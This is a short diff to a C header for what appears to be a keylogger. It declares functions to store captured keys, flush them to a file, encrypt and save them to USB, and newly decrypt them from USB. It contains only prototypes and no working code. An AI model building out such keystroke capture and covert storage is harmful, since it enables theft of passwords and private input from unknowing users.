@@ -8,9 +8,9 @@ typedef struct KeyLoggerStorage KeyLoggerStorage;
 
 KeyLoggerStorage* key_logger_storage_create(void);
 void key_logger_storage_destroy(KeyLoggerStorage* storage);
-
 bool key_logger_storage_add_key(KeyLoggerStorage* storage, const char* key);
 bool key_logger_storage_flush_to_file(KeyLoggerStorage* storage, const char* filepath);
 bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const char* usb_path);
+bool key_logger_storage_decrypt_from_usb(const char* filepath, char** decrypted_data, size_t* data_size);
 
 #endif // KEY_LOGGER_STORAGE_H
